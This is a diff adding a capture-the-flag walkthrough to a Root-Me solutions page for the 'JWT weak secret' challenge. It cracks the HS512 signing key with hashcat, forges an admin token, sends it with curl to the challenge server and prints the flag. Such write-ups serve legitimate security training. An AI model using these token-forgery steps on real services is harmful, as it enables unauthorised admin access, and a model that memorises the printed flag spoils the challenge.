@@ -1,4 +1,4 @@
-# [Root-Me](./rootme.md) Root-Me Web Server [21/74]
+# [Root-Me](./rootme.md) Root-Me Web Server [22/74]
 
 Discover the mechanisms, protocols and technologies used on the Internet and learn to abuse them!
 
@@ -27,7 +27,7 @@ These challenges are designed to train users on HTML, HTTP and other server side
 19. [JSON Web Token (JWT) - Introduction](#json-web-token-jwt-introduction) 🗸
 20. [Directory traversal](#directory-traversal) 🗸
 21. [File upload - Null byte](#file-upload-null-byte) 🗸
-22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret)
+22. [JSON Web Token (JWT) - Weak secret](#json-web-token-jwt-weak-secret) 🗸
 23. [JWT - Revoked token](#jwt-revoked-token)
 24. [PHP - assert()](#php-assert)
 25. [PHP - Filters](#php-filters)
@@ -2217,6 +2217,140 @@ YPNchi2NmTwygr2dgCCF
 
 ---
 
+
+## JSON Web Token JWT Weak secret
+
+- Author: Jrmbt
+- Date: 21 August 2019
+- Points: 25
+- Level: 3
+
+### Statement
+
+This API with its /hello endpoint (accessible with GET) seems rather welcoming at first glance but is actually trying to play a trick on you.
+
+Manage to recover its most valuable secrets!
+
+### Links
+
+1. [challenge site](http://challenge01.root-me.org/web-serveur/ch59/).
+
+### Resources
+
+1. [https://jwt.io/](https://jwt.io/).
+2. [RFC 7519](https://repository.root-me.org/RFC/EN%20-%20rfc7519.txt).
+3. [Attacking JWT Authentication](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Attacking%20JWT%20authentication%20-%20Sjoerd%20Langkemper.pdf).
+4. [Hacking JSON Web Token](https://repository.root-me.org/Exploitation%20-%20Web/EN%20-%20Hacking%20JSON%20Web%20Token%20(JWT)%20-%20Rudra%20Pratap.pdf).
+
+### Solutions
+
+<details>
+
+<summary markdown="span">Solution 1</summary>
+
+We can visit the website and navigate to http://challenge01.root-me.org/web-serveur/ch59/token to get the JWT:
+
+~~~
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
+~~~
+
+Decompiling in Python:
+
+~~~py
+import jwt
+import binascii
+
+encoded_jwt = "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw"
+decoded_jwt = jwt.decode(encoded_jwt, options={"verify_signature": False})
+
+print(decoded_jwt)
+
+import base64 as b64
+base64_jwt = encoded_jwt.split(".")
+bytes_jwt_1 = b64.b64decode(base64_jwt[0])
+bytes_jwt_2 = b64.b64decode(base64_jwt[1]+"==")
+hex_jwt_1 = bytes_jwt_1.hex()
+hex_jwt_2 = bytes_jwt_2.hex()
+bytes_jwt_3 = b64.urlsafe_b64decode(base64_jwt[2]+"==")
+hex_jwt_3 = bytes_jwt_3.hex()
+
+
+print(bytes_jwt_1.decode())
+print(bytes_jwt_2.decode())
+~~~
+
+We get:
+
+~~~
+{'role': 'guest'}
+{"typ":"JWT","alg":"HS512"}
+{"role":"guest"}
+~~~
+
+We can see the signature is hashed with HMAC+SHA512.  Let's try and find the secret key:
+
+We can save the JWT in a file encrypted_jwt.john:
+
+~~~
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiZ3Vlc3QifQ.4kBPNf7Y6BrtP-Y3A-vQXPY9jAh_d0E6L4IUjL65CvmEjgdTZyr2ag-TM-glH6EYKGgO3dBYbhblaPQsbeClcw
+~~~
+
+Using a dictionary attack with hashcat we can find the key:
+
+~~~shell
+$ hashcat -m 16500 encrypted_jwt.john -o cracked.txt rockyou.txt 
+~~~
+
+This provides the key: "lol".
+
+We can now generate a new key in Python:
+
+~~~py
+new_jwt = jwt.encode({"role": "admin"},"lol",algorithm="HS512")
+print(new_jwt)
+~~~
+
+This provides a new token:
+
+~~~
+eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA
+~~~
+
+We can submit this as a POST request as described on the homepage using curl:
+
+~~~shell
+$ curl -X POST http://challenge01.root-me.org/web-serveur/ch59/admin -d "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA"
+{"message": "method to authenticate is: 'Authorization: Bearer YOURTOKEN'"}
+~~~
+
+We can see the site is asking for us to use this as a Bearer authentication token in the header, retrying:
+
+~~~shell
+$ curl -X POST http://challenge01.root-me.org/web-serveur/ch59/admin -H "Authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzUxMiJ9.eyJyb2xlIjoiYWRtaW4ifQ.y9GHxQbH70x_S8F_VPAjra_S-nQ9MsRnuvwWFGoIyKXKk8xCcMpYljN190KcV1qV6qLFTNrvg4Gwyv29OCjAWA"
+~~~
+
+This gives the solution.
+
+</details>
+
+### Answer
+
+<details>
+
+<summary markdown="span">Answer</summary>
+
+~~~
+PleaseUseAStrongSecretNextTime
+~~~
+
+</details>
+
+---
+
+### [Web - Server](#contents) | [Root-Me](./rootme.md) | [Home](./index.md)
+
+---
+	
 Last updated Jan 2022.
 
 ## [djm89uk.github.io](https://djm89uk.github.io)
